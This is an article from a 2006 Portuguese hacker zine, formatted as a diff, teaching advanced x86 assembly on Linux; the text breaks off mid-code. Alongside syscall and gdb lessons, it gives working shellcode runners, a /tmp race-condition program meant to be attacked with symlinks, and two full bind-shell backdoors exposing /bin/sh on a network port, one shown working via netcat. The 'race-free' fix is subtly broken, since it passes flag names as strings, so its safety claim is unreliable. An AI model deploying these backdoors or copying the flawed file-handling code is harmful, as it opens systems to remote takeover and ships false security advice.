@@ -1,0 +1,1209 @@
+[ --- The Bug! Magazine
+
+                    _____ _              ___               _
+                   /__   \ |__   ___    / __\_   _  __ _  / \
+                     / /\/ '_ \ / _ \  /__\// | | |/ _` |/  /
+                    / /  | | | |  __/ / \/  \ |_| | (_| /\_/
+                    \/   |_| |_|\___| \_____/\__,_|\__, \/
+                                                   |___/
+
+                      [ M . A . G . A . Z . I . N . E ]
+
+
+             [ Numero 0x01 <---> Edicao 0x01 <---> Artigo 0x01 ]
+
+
+
+.> 23 de Marco de 2006,
+.> The Bug! Magazine < staff [at] thebugmagazine [dot] org >
+
+
+
+
+
+                    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+                     Assembly avancado em Linux - x86 AT&T
+		    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+
+
+.> 08 de Fevereiro de 2006,
+.> Gustavo C. a.k.a hophet < hophet [at] gmail [dot] com >
+
+
+
+[ --- Indice
+
++     1.     <--->  Introducao
++     2.     <--->  Assembly para Linux
++       2.1.  <->     Segmentos & Offset's
++       2.2.  <->     Real Mode x Protected Mode
++       2.3.  <->     Variaveis x Gdb
++       2.4.  <->     Gcc Inline
++       2.5.  <->     Syscalls & Syscall "__NR_execve"
++       2.6.  <->     Race Conditions
++       2.7.  <->     Lendo Argumentos (argc, argv)
++       2.8.  <->     Sockets
++     3.     <--->  Terminando
+
+
+
+[ --- 1. Introducao
+
+Senhores, nao pretendo ser longo neste paper pretendo tratar de assuntos um
+pouco mais avancados e de forma objetiva.
+
+Aconselho a leitura do algum material mais basico sobre assembly[1] nao entra-
+rei em detalhes sobre a linguagem. O completo entendimento deste requer conhe-
+cimento previo sobre assembly.
+
+PS.: Nos "shellcodes" apresentados no texto, nao me preocupei com NULL bytes.
+     Lembre-se de levalos em consideracao nos seus testes com overflows.
+
+Acredito que seja isso. =]
+
+[1] - http://www.nlabs.com.br/~hophet/docs/assembly_em_linux.txt
+
+
+
+[ --- 2. Assembly para Linux
+
+
+[ --- 2.1. Segmentos & Offset's
+
+Segmentos sao "espacos de memoria"  que no caso da arquitetura x86 tem o tama-
+nho de 64Kb ate' os  processadores 80386, e pode ter tamanhos menores ou maio-
+res de acordo com as instrucoes utilizadas, nos processadores atuais.
+
+Por exemplo, se  voce tem instrucoes que irao ocupar apenas 20Kb, um segmento
+de 20Kb sera' criado.
+
+Os processadores atuais continuam permitindo segmentos de 64Kb (65536 bytes),
+a distancia entre esses segmentos e' de 16 bytes loteando assim as posicoes de
+memoria.
+
+Ainda em segmentos temos os offset's, os offset's sao "pedacos de memoria" den-
+tro do "segmento". Vale ainda falar dos registradores que manipulam e calculam
+os segmentos e offsets.
+
+Sao eles:
+
++     %cs (Code Segment) => Genrecia o "segmento" onde se encontra o "codigo do
++                           programa".
++
++     %ds (Data Segment) => Gerencia o "segmento" onde se encontra os "dados do
++                           programa".
++
++     %es (Extra Segment) => E' um gerenciador adicional.
++
++     %ss (Stack Segment) => Gerencia o "segmento" onde se encontra o "Stack".
++                            E' nele que o processador armazena o "endereco de
++                            retorno" das rotinas. ;)
++
++     %eip (Instrucion Pointer) => E' nele que fica  armazenado o "offset" do
++                                  "segmento de codigo" que contem a proxima
++                                  "instrucao" a ser executada. 
+
+Veja:
+
+%cs = 08048094 (endereco do "segmento de codigo")
+%eip = 05 (offset "n" no "segmento de codigo")
+
+08048094 + 05 = 08048099 => (endereco da proxima "instrucao")
+
+Podemos representar os offset's da seguinte forma:
+
+segmento:offset = 08048094:5, offset = 08048099 (end. offset)
+
+Vamos ver isso na pratica ;) 
+
+hophet@breakdown ~/projetos/asm $ objdump -D w
+
+w:     file format elf32-i386
+
+Disassembly of section .text:
+
+08048094 <_start>:
+ 8048094:	b8 04 00 00 00       	mov    $0x4,%eax
+ 8048099:	bb 01 00 00 00       	mov    $0x1,%ebx
+ 804809e:	8d 0d b8 90 04 08    	lea    0x80490b8,%ecx
+ 80480a4:	8d 15 bf 90 04 08    	lea    0x80490bf,%edx
+ 80480aa:	cd 80                	int    $0x80
+ 80480ac:	b8 01 00 00 00       	mov    $0x1,%eax
+ 80480b1:	bb 00 00 00 00       	mov    $0x0,%ebx
+ 80480b6:	cd 80                	int    $0x80
+Disassembly of section .data:
+
+080490b8 <W>:
+ 80490b8:	4f                   	dec    %edi
+ 80490b9:	49                   	dec    %ecx
+ 80490ba:	21 21                	and    %esp,(%ecx)
+ 80490bc:	21 0a                	and    %ecx,(%edx)
+	...
+
+080490bf <T>:
+ 80490bf:	07                   	pop    %es
+ 80490c0:	00 00                	add    %al,(%eax)
+	...
+
+Se reparar temos o "segmento de codigo" (.text), que vai de 08048094 a 080480b6
+e o "segmento de dados" que  nesse  caso possue dois segmentos de memoria, de
+080490b8 a 080490bc e 080490bf a 080490c0. Cada endereco dentro desses segmen-
+tos e' um offset ;)
+
+Se voce quiser brincar com os binarios que criar em assembly pode usar as fer-
+ramentas GNU abaixo, informacoes interessantes podem surgir ;)
+
++     gdb
++     strings
++     strace
++     strip
++     objdump
++     hexdump
++     nm
++     readelf
++     file
+
+So' um detalhe que achei interessante colocar e que pode nos ajudar mais na
+frente. E isso vale pra maioria dos registradores. Veja: ;)
+
++     %eax	= 32 bits	(4 bytes)
++     %ax	= 16 bits	(2 bytes)
++     %al	= 8  bits	(1 byte )
++     %ah	= 8  bits	(1 byte	)      (1 byte = 1 caracter)
+
+
+
+[ --- 2.2. Real Mode x Protected Mode
+
+O "real mode" ou "RMode" e' o modo que se encontra o processador assim que ele
+e' ligado, antes dos processadores 80286 esse era o modo de trabalho default.
+Onde o processador so' conseguia acessar/enderecar no maximmo 640Kbytes de me-
+moria, tem acesso direto as rotinas da BIOS e ao hardware. Os registradores
+tinham tamanho de 16 bits ;).
+
+O DOS trabalhou em "RMode" ate' a chegada do Windows 3.1, que comecou a traba-
+lhar em "PMode" e usar enderecamento de 32 bits com a chegada dos processadores
+386.
+
+O "protected mode" ou "PMode" e' o modo de trabalho  default a partir do 80286.
+Esse modo permite maior capacidade de enderecamento de memoria, permissao de
+acesso desta memoria, protecao de memoria, suporte a multitarefa, utilizacao de
+memoria virtual (paging). A partir dos processadores 386 os registradores pas-
+saram a ter 32 bits e suportar enderecamento de memoria de ate' 4 Gbytes e a
+compatibilidade com os anteriores permaneceu.
+
+Tanto que ate' hoje os processadores iniciam em "RMode" e o SO (Sistema Opera-
+cional) se encarrega de passar o processador para o "PMode" logo apos o
+power-on.
+
+O Linux (falo do kernel ;) em seu boot inicia em "RMode" usan do segmentos de
+64k, como pode ser visto em:
+
++     /usr/src/linux/arch/i386/boot/bootsect.S
+
+Mas, depois de fazer algumas perguntas sobre memoria/disco/entre outras coisas
+para a BIOS e colocar as repostas em um lugar seguro, faz a transicao para o
+"PMode", como pode ser visto em:
+
++     /usr/src/linux/arch/i386/boot/setup.S
+
+Lembrando que tudo isso e' valido para arquitetura x86. ;)
+
+
+
+[ --- 2.3. Variaveis x Gdb
+
+Nao pretendo ser longo nesse topico, seu objetivo  e' apenasmostrar como e'
+calculado o tamanho das variaveis no assembly.
+
+Normalmente declaramos "variaveis" na sintese AT&T da seguinte forma:
+
+VAR: .string "valor\n"
+TAM: .long . - VAR
+
+Vamos falar como o compilador/linker manipula essas informacoes e define os va-
+lores a cada variavel. Lembrando que a definicoes das variaveis pode variar de
+um compilador pro outro.
+
+Utilizaremos para criar o "object file" o "as" e para linkarmos o object file o
+"ld", criando assim um binario elf.
+
+Veja: 
+
+$ as asm.s -o asm.o
+$ ld asm.o -o asm
+
+Vamos "descecar" as declaracoes.
+
+VAR: .string "valor\n" => Declaro que "VAR" vai armazenar um "valor\n" do tipo
+                          "string". Isso e' simples e claro.
+
+TAM: .long . - VAR => Aqui as coisas complicam um pouco mais. Mas voce vai
+                      entender. 
+
+A forma de calcular o tamanho da variavel "VAR" e  armazenar em "TAM", pode
+seguir a seguinte formula:
+
+tam = posicao_atual - posicao_inicial
+
+Exatamente o que a declaracao faz: ". - VAR", onde:
+
+.	= posicao_atual
+-	= subtracao ;)
+VAR	= posicao_inicial
+
+Lembrese que toda variavel e' armazenada no %ds (Data Segment) que por sua vez
+e' alocado na memoria. ;)
+
+Vamos ver isso na pratica. Compile:
+
+----cut----
+
+# Codigo teste tamanho variaveis
+# hophet [at] gmail.com
+
+.section .data
+
+W: .string "rfdslabs!!!\n"
+T: .long . - W
+
+.section .text
+
+.globl _start
+
+_start:
+
+	movl $0x4, %eax
+	movl $0x1, %ebx
+	leal W, %ecx
+	leal T, %edx
+	int $0x80
+
+	movl $0x1, %eax
+	movl $0x0, %ebx
+	int $0x80
+
+# eof
+
+----cut----
+
+Execute e veja com seus proprios olhos, hehe ;)
+
+
+hophet@breakdown ~/projetos/asm $ gdb ./var -q
+(no debugging symbols found)
+Using host libthread_db library "/lib/libthread_db.so.1".
+(gdb) disass _start
+Dump of assembler code for function _start:
+0x08048094 <_start+0>:  mov    $0x4,%eax
+0x08048099 <_start+5>:  mov    $0x1,%ebx
+0x0804809e <_start+10>: lea    0x80490b8,%ecx
+0x080480a4 <_start+16>: lea    0x80490c5,%edx
+0x080480aa <_start+22>: int    $0x80
+0x080480ac <_start+24>: mov    $0x1,%eax
+0x080480b1 <_start+29>: mov    $0x0,%ebx
+0x080480b6 <_start+34>: int    $0x80
+End of assembler dump.
+(gdb) x/s 0x80490b8
+0x80490b8 <W>:   "rfdslabs!!!\n"
+(gdb) x/s 0x80490c3
+0x80490c3 <W+11>:        "\n"
+(gdb) x/s 0x80490c4
+0x80490c4 <W+12>:        ""
+(gdb) x/d 0x80490c5
+0x80490c5 <T>:  13
+(gdb) quit
+hophet@breakdown ~/projetos/asm $
+
+
+Vou detalhar algumas linhas:
+
+...
+0x0804809e <_start+10>: lea    0x80490b8,%ecx
+...
+
+Aqui temos o endereco de memoria da variavel "W".
+
+...
+0x080480a4 <_start+16>: lea    0x80490c5,%edx
+...
+
+Aqui temos o endereco de memoria da variavel "T".
+
+...
+(gdb) x/s 0x80490b8
+0x80490b8 <W>:   "rfdslabs!!!\n"
+...
+
+Como voce pode ver aqui temos o endereco inicial de "W", ou seja, W = 0x80490b8
+
+...
+(gdb) x/s 0x80490c3
+0x80490c3 <W+11>:        "\n"
+(gdb) x/s 0x80490c4
+0x80490c4 <W+12>:        ""
+...
+
+Essas duas linhas mostram o fim da string (\n) e o NULL byte que finaliza a
+string. Mostra tambem quantos bytes a variave l "W" ocupo, "<W+12", ou seja 13
+bytes (Comeca em 0 ;).
+
+Entao a  "posicao_atual" e' = "0x80490c4". Certo? ;)
+
+...
+(gdb) x/d 0x80490c5
+0x80490c5 <T>:  13
+...
+
+Nesse caso temos o endereco de memoria da variavel "T" e seu valor, o tamanho
+de "W", que e' 13 bytes. "T" = 0x80490c5. Ou seja, o tamanho da variavel "W"
+e' armazenada no proximo endereco de memoria.
+
+Nao seria necessario a conta agora que sabemos, mas...
+
+T = 0x80490c4 - 0x80490b8. T = 13. =P
+
+0x80490c5 = 13
+
+Esta ai' o porque. Espero que tenha esclarecido as ideias de alguem ;)
+
+
+
+[ --- 2.4. Gcc Inline
+
+Basicamente o "gcc inline" nos permite executar "instrucoes" assembly dentro de
+um programa "C". O "gcc inline" pode ser usado para varios objetivos, entre
+eles:
+
++     Escrever programas assembly.
++     Escrever programas assembly usando a libc.
++     Execucao de shellcodes.
++     Ajudar na escrita de shellcodes.
+
+Vale lembrar que as regras da linguagem assembly AT&T sao as validas e aplica-
+das no "gcc inline".
+
+Basicamente o "gcc inline" pode ser usado das seguintes formas:
+
+
+	asm("mov %esp, %ecx");
+	
+	ou
+	
+	asm("nop;nop;nop");
+	
+	ou
+
+	__asm("
+		mov $0x1, %eax
+		xor %ebx, %ebx
+		int $0x80
+	");
+
+	ou
+
+	__asm__(
+		"mov $0x1, %eax	\n"
+		"xor %ebx, %ebx	\n"
+		"int $0x80	\n"
+		);
+
+
+Todas "declaracoes" tem o mesmo signifcado e funcionam da mesma forma.
+
+Vamos a alguns exemplos praticos disso.
+
+
+Abaixo segue um exemplo simples de "gcc inline" que apenas imprime um "OI!!" e
+pode tranquilamente ser usado para criacao de um shellcode, como veremos em
+outro exemplo ;)
+
+Compile com:
+
+$ gcc hi.c -o hi
+
+----cut----
+
+/* "gcc inline" para criacao de um shellcode. */
+/* Lembrando que soh podemos empurar 4 bytes  */
+/* por vez no "Stack" (%esp).		      */
+/* hophet [at] gmail.com		      */
+
+#include <stdio.h>
+
+int main() {
+
+__asm__(
+	"push	$0x0a		\n" /* String, "\n"	 	   */
+	"push	$0x2121494f	\n" /* String, "OI!!"	 	   */
+	"mov	%esp, %ecx	\n" /* Guardamos "Stack" em %ecx   */
+	"mov	$0x4, %eax	\n" /* Syscall write()		   */
+	"mov	$0x1, %ebx	\n" /* STDOUT 		  	   */
+	"mov	$0x5, %edx	\n" /* Tamanho da "String"	   */
+	"int	$0x80		\n" /* Send ...	=P		   */
+	"mov	$0x1, %eax	\n" /* Syscall exit()		   */
+	"xor	%ebx, %ebx	\n" /* "Exit_Success", 0 em %ebx   */
+	"int	$0x80		\n" /* Send ...	=P		   */
+	);
+}
+
+----cut----
+
+
+Abaixo vemos um "shellcode" que escrevi com base no code acima e como executo
+esse shellcode rapidamente, usando "gcc inline" em vez de ponteiros para fun-
+cao, casts e afins =D
+
+Compile com:
+
+$ gcc sc.c -o sc
+
+----cut----
+
+/* Shellcode escrito com base no hi.c */
+/* usando "gcc inline"		      */
+/* hophet [at] gmail.com	      */
+
+#include <stdlib.h>
+
+char shellcode[] =
+		"\x6a\x0a\x68\x4f\x49\x21\x21\x89\xe1\xb8\x04"
+		"\x00\x00\x00\xbb\x01\x00\x00\x00\xba\x05\x00"
+		"\x00\x00\xcd\x80\xb8\x01\x00\x00\x00\x31\xdb"
+		"\xcd\x80\xc9\xc3"; /* Nosso code, "OI!!" */
+
+int main() {
+	
+__asm__("jmp shellcode"); /* Vamo pular, huhuhu ... */
+
+}
+
+----cut----
+
+Saltamos direto para nosso "shellcode" ;)
+Compile, execute e veja os resultados. =)
+
+
+
+[ --- 2.5. Syscalls & Syscall "__NR_execve"
+
+Bem, esse topico visa detalhar um pouco a utilizacao de "syscalls" (Chamadas de
+Sistema) e como manipulalas da melhor forma. 
+
+
+*** "System calls" com menos de 6 argumentos:
+
+O numero da "syscall" vai em %eax. E os argumentos vao em %ebx, %ecx, %edx,
+%esi, %edi, nessa ordem. O valor de retorno da syscall estara' em %eax.
+
+Um lista das "system calls" do Linux, pode ser encontrada no arquivo abaixo,
+juntamente com seus numeros:
+
++     /usr/src/linux/include/asm/unistd.h
+
+
+*** "System calls" com mais de 5 argumentos:
+
+O numero da "syscall" continua em %eax. Mas seus argumentos, devem ser armaze-
+nados e organizados na memoria e o endereco do primeiro argumento armazenado em
+%ebx.
+
+Empurramos os argumentos no "stack" de traz pra frente, do ultimo argumento pa-
+ra o primeiro e copiamos o ponteiro  para o stack em %ebx. Outra forma e' co-
+piar os argumentos para um espaco alocado de memoria e armazenar o endereco do
+primeiro argumento em %ebx. 
+
+Mais informacoes sobre "system calls" e seus "argumentos":
+
++     $ man 2 <syscall>. Ex.: $ man 2 execve.
+
+Vamos ver exemplos disso. lol
+
+Esse primeiro exemplo mostra como podemos passar "argumentos" pra "system call"
+__NR_execve, existe alguns interesses em se fazer isso, algum deles sao:
+
+* Escrever codigos que suportam execucao de comandos externos com argumentos.
+
+* Escrever "shellcodes" que executam nao apenas comandos, mas comandos mais
+  argumentos. O que pode ser bem interessante.
+
+Existem outras muitas possibilidades, seja criativo =P
+
+----cut----
+
+# Syscall "__NR_execve" executando "uname" com "argumentos"
+# hophet [at] gmail.com
+
+.section .data
+
+cmd0: .string "/bin/uname" # Nosso "comando"
+cmd1: .string "-a"	   # Nosso "argumento"
+NULL: .long 0x0
+
+.section .text
+
+.globl _start
+
+_start:
+	sub $0x0e, %esp	# Liberamos "14" bytes no Stack
+	push $NULL	# Empurramos "/bin/uname, -a, NULL"
+	push $cmd1	# para o Stack.
+	push $cmd0
+	mov %esp, %ecx	# "char *const argv[]" em %ecx ;)
+	
+	# execve()
+	mov $0x0b, %eax	# __NR_execve, 11
+	mov $cmd0, %ebx # *filename, "/bin/uname"
+	mov $NULL, %edx	# Sem "variaveis de ambiente"
+	int $0x80	# Execute via "linux interrupt service"
+
+	# exit()
+	mov $0x1, %eax
+	mov $0x0, %ebx
+	int $0x80
+
+----cut----
+
+No proximo topico existe um exemplo interessante de utilizacao do "stack" para
+manipular argumentos de syscall.
+
+
+
+[ --- 2.6. - Race Conditions
+
+Basicamente e resumidamente um "race condition" ocorre quando um programa nao
+trabalha como esperado porque uma ordem de eventos inesperados produz uma dis-
+puta ao mesmo recurso.
+
+Nao vou explicar como funcionao os "race conditions" mas vou mostrar como evi-
+ta-los na linguagem "assembly".
+
+Uma condicao de "race condition" pode acontecer de varias formas:
+
++     "Atomic Actions" no Sistema de Arquivos;
++     "Shared Memory" entre Threads;
++     Manipulacao de "Signals";
++     Arquivos Temporarios;
++     Locking;
++     Entre outras.
+
+
+Abaixo segue um codigo assembly vulneravel a "race condition" por manipular de
+forma nao apropriada arquivos no "/tmp".
+
+----cut----
+
+# Code vulneravel a "Race Condition" via "/tmp"
+# Escreve no arquivo "rc.xxx" em "/tmp"
+# hophet [at] gmail.com
+
+.section .data
+
+MSG1: .string "Escrevendo em /tmp/rc.xxx ...\n"
+TAM1: .long . - MSG1
+
+MSG2: .string "rfdslabs!!!\n" 
+TAM2: .long . - MSG2
+
+FILE: .string "/tmp/rc.xxx"
+MODO: .string "O_RDWR"
+ 
+.section .text
+
+.globl _start
+
+_start:
+ 
+      # Syscall write() 
+      movl $0x4, %eax 
+      movl $0x1, %ebx
+      leal MSG1, %ecx
+      leal TAM1, %edx  
+      int $0x80
+
+      # Syscall open() 
+      movl $0x5, %eax
+      movl $FILE, %ebx # Abrindo arquivo ...
+      movl $MODO, %ecx # Leitura-escrita 
+      movl $0x0, %edx  # Permisao, 0
+      int $0x80
+
+      # Move o "retorno" de open() para %esi.
+      movl %eax, %esi
+
+      # Syscall write()   
+      movl $0x4, %eax
+      movl %esi, %ebx # file descriptor, rc.xxx 
+      leal MSG2, %ecx # Escrevendo MSG2 ...
+      leal TAM2, %edx
+      int $0x80
+
+      # Syscall close()
+      movl $0x6, %eax
+      movl %esi, %ebx # Fechando rc.xxx
+      int $0x80
+
+      # Syscall exit()
+      movl $0x0, %eax
+      movl $0x1, %ebx # Trocar de valores
+      xchg %eax, %ebx # Invencao de moda =P
+      int $0x80
+
+----cut----
+
+Se quiser pode brincar com "links simbolicos" no "/tmp" pode ser divertido ;)
+
+
+Abaixo segue a forma correta de manipular arquivos temporarios e evitar esse
+tipo de problema em codes assembly.
+
+----cut----
+
+# Code livre de "Race Condition"
+# Escreve no arquivo "rc.xxx" em "/tmp"
+# hophet [at] gmail.com
+
+.section .data
+
+MSG1: .string "Escrevendo em /tmp/rc.xxx ...\n"
+TAM1: .long . - MSG1
+
+MSG2: .string "rfdslabs!!!\n" 
+TAM2: .long . - MSG2
+
+FILE: .string "/tmp/rc.xxx"
+F1: .string "O_CREAT"	# Se "rc.xxx" nao existir, crie
+F2: .string "O_EXCL"	# Se existir faz open() falhar ;)
+F3: .string "O_TRUNC"	# Trunca "rc.xxx" se existir
+F4: .string "O_RDWR"	# Abre para leitura/escrita
+PIPE: .long 0x7c	# Pipe, "|"
+PERM: .long 0600	# Permissao
+ 
+.section .text
+
+.globl _start
+
+_start:
+ 
+      # Syscall write() 
+      movl $0x4, %eax 
+      movl $0x1, %ebx
+      leal MSG1, %ecx
+      leal TAM1, %edx  
+      int $0x80
+
+      # Syscall open() 
+      push $F4		# Empurramos tudo pra "Pilha"
+      push $PIPE
+      push $F3
+      push $PIPE
+      push $F2
+      push $PIPE
+      push $F1
+      mov %esp, %ecx	# Flags em %ecx
+      
+      movl $0x5, %eax
+      movl $FILE, %ebx	# Abrindo arquivo, rc.xxx
+      movl $PERM, %edx	# Permisao, 0600
+      int $0x80
+
+      # Move o "retorno" de open() para %esi
+      movl %eax, %esi
+
+      # Syscall write()   
+      movl $0x4, %eax
+      movl %esi, %ebx	# file descriptor, rc.xxx 
+      leal MSG2, %ecx	# Escrevendo MSG2...
+      leal TAM2, %edx
+      int $0x80
+
+      # Syscall close()
+      movl $0x6, %eax
+      movl %esi, %ebx	# Fechando, rc.xxx ...
+      int $0x80
+
+      # Syscall exit()
+      movl $0x1, %eax
+      movl $0x0, %ebx
+      int $0x80
+
+----cut----
+
+Agora usamos alguns parametros que vao impedir que links simbolicos sejam cri-
+ados. Compile, execute e veja as diferencas na pratica ;)
+
+
+
+[ --- 2.7. Lendo Argumentos (argc, argv)
+
+Os "argumentos" de linha de comando nos binarios do linux sao armazenados e
+organizados no "Stack". Como na linguagem "C" o "argc" vem primeiro, seguido de
+"**argv" com as strings da linha de comando terminando com um NULL byte. Logo
+depois vem "**envp" que eh um ponteiro para as variaveis de ambiente, tambem
+seguidos por um NULL.
+
+Vamos ver isso na pratica ;)
+
+----cut----
+
+# Imprimi os argumentos que foram passados
+# em "linha de comando".
+# hophet [at] gmail.com
+
+.section .data
+
+nl:	.long 0x0a	# 0x0a, "\n"
+tam:	.long . - nl
+
+.section .text
+
+.globl _start
+
+_start:
+
+	pop %eax	# Verifica se "argc" esta
+	dec %eax	# vazio.
+	jz exit		# Se sim, exit() ...
+	pop %ecx	# Eliminamos "argv[0]"
+
+	loop:
+	pop %ecx	# Obtem "argv[1]", "argv[2]" ...
+	or %ecx, %ecx	# Verifica se igual a NULL
+	jz exit		# Se NULL, exit() ...
+
+	mov %ecx, %esi	# Guarda "argv[n]" em %esi
+	xor %edx, %edx	# Zera %edx
+
+	# Encontra o tamanho da string.
+	# Incrementa %edx ate' que chegue ao seu final
+	# "\0", (NULL), ou seja, %al igual a 0.
+	strlen:	
+	inc %edx	# Contador
+
+	lodsb		# Carrego %esi (argv[n]) em %eax
+	or %al, %al	# Verifica se igual a NULL
+	jnz strlen	# Se NAO, repete ...
+	dec %edx	# Se SIM, decrementa %edx
+
+	# Imprimi "argumentos"
+	mov $0x4, %eax	# __NR_write, 4
+	mov $0x1, %ebx	# stdout, 1
+	int $0x80
+	
+	# Imprimi "\n" ao final de cada argumento
+	mov $0x4, %eax	# __NR_write, 4
+	mov $0x1, %ebx	# stdout, 1
+	mov $nl, %ecx	# \n
+	mov $tam, %edx	# Tamanho de $nl
+	int $0x80
+
+	jmp loop	# Again ... ;)
+
+	exit:
+	mov $0x1, %eax	# exit()
+	int $0x80	
+
+----cut-----
+
+Compilando e executando temos isso:
+
+hophet@breakdown ~/projetos/asm $ as args.s -o args.o
+hophet@breakdown ~/projetos/asm $ ld args.o -o args
+
+hophet@breakdown ~/projetos/asm $ ./args
+hophet@breakdown ~/projetos/asm $ ./args Free your mind \!\!\!
+Free
+your
+mind
+!!!
+hophet@breakdown ~/projetos/asm $ ./args "Free your mind..."
+Free your mind...
+hophet@breakdown ~/projetos/asm $ 
+
+E' isso. ;)
+
+
+
+[ --- 2.8. Sockets
+
+Bem, vou mostrar alguns exemplos de como se criar "sockets" em assembly. A cri-
+acao de sockets em assembly pode ter varios objetivos, como criacao de shell-
+codes que podem ser usados na exploracao de Buffer Overflows, criacao de "back-
+doors" pequenas e rapidas, criacao de virus (muitos sao escritos em assembly)
+com caracteristicas de backdoors, entre outros.
+
+Vou mostrar dois exemplos de criacao de "sockets", todos sao conhecidos como
+"bindshell" e tem a funcao de bindar uma shell em uma porta especifica.
+
+Veja:
+
+----cut----
+
+# BindShell escrita em Assembly
+# Binda uma shell na porta 30464
+#
+# Compile com:
+# $ as bindshell.s -o bindshell.o
+# $ ld bindshell.o -o bindshell
+#
+# hophet [at] gmail.com
+
+.section .data
+
+.section .text 
+
+.globl _start
+
+_start:
+
+sub $0x80, %esp
+
+	# fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) 
+	xorl    %eax,%eax
+	xorl    %ebx,%ebx
+	xorl    %ecx,%ecx
+	xorl    %edx,%edx
+	xorl    %ebp,%ebp
+	movb    $0x66,%al
+	movb    $0x1,%bl
+	pushl   %ecx
+	movb    $0x6,%cl
+	pushl   %ecx
+	movb    $0x1,%cl
+	pushl   %ecx
+	movb    $0x2,%cl
+	pushl   %ecx
+	leal    (%esp),%ecx
+	int     $0x80
+	add     $0x10,%esp
+
+	# bind(fd, (struct sockaddr)&sin,  sizeof(sin) ) 
+	movb    $0x2,%bl
+	xorl    %ecx,%ecx
+	pushl   %ecx
+	pushl   %ecx
+	pushl   %ecx
+	movb    $0x77,%cl
+	pushw   %cx
+	movb    $0x2,%cl
+	pushw   %cx
+	leal    (%esp),%ecx
+	movb    $0x10,%dl
+	pushl   %edx
+	pushl   %ecx
+	pushl   %eax
+	leal    (%esp),%ecx
+	movl    %eax,%edx
+	xorl    %eax,%eax
+	movb    $0x66,%al
+	int     $0x80
+	add     $0x1c,%esp
+
+	xor     %ecx,%ecx
+	cmp     %eax,%ecx
+	je      fork
+
+	fork:
+	# fork() 
+	mov     %eax,%ebp
+	movl    %eax,%ebx
+	xorl    %eax,%eax
+	movb    $0x2,%al
+	int     $0x80
+	testl   %eax, %eax
+	je      child
+
+	child:
+	# listen(fd, 1) 
+	movb    $0x1,%bl
+	pushl   %ebx
+	pushl   %edx
+	leal    (%esp),%ecx
+	xorl    %eax,%eax
+	movb    $0x66,%al
+	movb    $0x4,%bl
+	int     $0x80
+	add     $0x08,%esp
+	xorl    %ebx,%ebx
+
+	incomming:
+	xorl    %eax,%eax
+	cmp     %eax,%ebx
+	je skip
+
+	# close(old cli) 
+	mov     $0x6,%al
+	int     $0x80
+	xorl    %ebx,%ebx
+	xor     %eax,%eax
+
+	skip:
+	# cli = accept(fd, 0, 0) 
+	pushl   %eax
+	pushl   %eax
+	pushl   %edx
+	leal    (%esp),%ecx
+	movb    $0x5,%bl
+	movb    $0x66,%al
+	int     $0x80
+	add     $0x0c,%esp
+
+	# fork() 
+	mov     %eax,%ebp
+	movl    %eax,%ebx
+	xorl    %eax,%eax
+	movb    $0x2,%al
+	int     $0x80
+	testl   %eax, %eax
+	je      incomming
+
+	sub     $0x80,%esp
+
+	# dup2(cli, 0) 
+	xorl    %ecx,%ecx
+	xorl    %eax,%eax
+	movb    $0x3f,%al
+	int     $0x80
+	# dup2(cli, 1) 
+	xorl    %ecx,%ecx
+	inc     %ecx
+	movl    %ebp,%ebx
+	xorl    %eax,%eax
+	movb    $0x3f,%al
+	int     $0x80
+	# dup2(cli, 2) 
+	inc     %ecx
+	xorl    %eax,%eax
+	movb    $0x3f,%al
+	int     $0x80
+	# execve("//bin/sh", ["//bin/sh", NULL], NULL); 
+	xorl    %ebx,%ebx
+	pushl   %ebx
+	pushl   $0x68732f6e
+	pushl   $0x69622f2f
+	movl    %esp,%ebx
+	leal    0x8(%esp),%edx
+	xorl    %ecx,%ecx
+	pushl   %ecx
+	pushl   %ebx
+	leal    (%esp),%ecx
+	xorl    %eax,%eax
+	movb    $0xb,%al
+	int     $0x80
+
+	exit:
+	# close(0) 
+	xor     %eax,%eax
+	xorl    %ebx,%ebx
+	mov     $0x6,%al
+	int     $0x80
+
+	# close(1) 
+	inc     %bl
+	xor     %eax,%eax
+	mov     $0x6,%al
+	int     $0x80
+
+	# exit() 
+	xor     %eax,%eax
+	mov     $0x1,%al
+	int     $0x80
+
+----cut----
+
+Compilando e executando temos:
+
+hophet@breakdown ~/projetos/asm $ ./bindshell 
+hophet@breakdown ~/projetos/asm $ netcat localhost 30464
+id      
+uid=1000(hophet) gid=100(users) groups=10(wheel),18(audio),100(users)
+exit
+hophet@breakdown ~/projetos/asm $ 
+
+A bindshell abaixo econtrei na LinuxAssembly.org e foi escrita por Philip, a
+acrescentei ao paper por ter achado interessante como foi escrita. Tive que mu-
+dar peguenos detalhes para conseguir compilar com o "as", porque com o gcc nao
+tava rolando.
+
+----cut----
+
+# defines.h 
+
+SYS_exit		= 1
+SYS_fork		= 2
+SYS_write		= 4
+SYS_open		= 5
+SYS_close		= 6
+SYS_execve 		= 11
+SYS_lseek		= 19
+SYS_dup2		= 63
+SYS_mmap 		= 90
+SYS_munmap		= 91
+SYS_socketcall		= 102
+SYS_socketcall_socket	= 1
+SYS_socketcall_bind	= 2
+SYS_socketcall_listen	= 4
+SYS_socketcall_accept	= 5
+
+SEEK_END		= 2
+PROT_READ		= 1
+MAP_SHARED		= 1
+
+AF_INET			= 2
+SOCK_STREAM		= 1
+IPPROTO_TCP		= 6
+
+STDOUT			= 1
+
+----cut----
+
+
+----cut----
+
+# daemon.s 
+
+# BindShell em Assembly
+# 
+# Compile com:
+# $ as daemon.s -o daemon.o
+# $ ld deamon.o -o daemon
+# 
+# http://www.linuxassembly.org/
+
+.include "defines.h"
+
+BIND_PORT	= 0xff00	# 255 (random)
+
+.data
+
+SOCK:
+	.long 	0x0
+
+LEN:	
+	.long	0x10
+
+SHELL:
+	.string "/bin/sh"
+
+.text 
+
+.globl _start
+
+_start:
+	
+	subl	$0x20,%esp 
+
+	# socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
+	movl	$SYS_socketcall,%eax
+	movl	$SYS_socketcall_socket,%ebx
+	movl	$AF_INET,(%esp)
+	movl	$SOCK_STREAM,0x4(%esp)
+	movl 	$IPPROTO_TCP,0x8(%esp)
+	movl	%esp,%ecx
+	int	$0x80
+
+	# save sockfd
+	movl	%eax,SOCK
+	xorl	%edx,%edx
+
+	# bind(%eax, %esp+0xc, 0x10);
+	movw	$AF_INET,0xc(%esp)
+	movw	$BIND_PORT,0xe(%esp)
+	movl	%edx,0x10(%esp)
+	movl	%eax,(%esp)
+	leal	0xc(%esp),%ebx
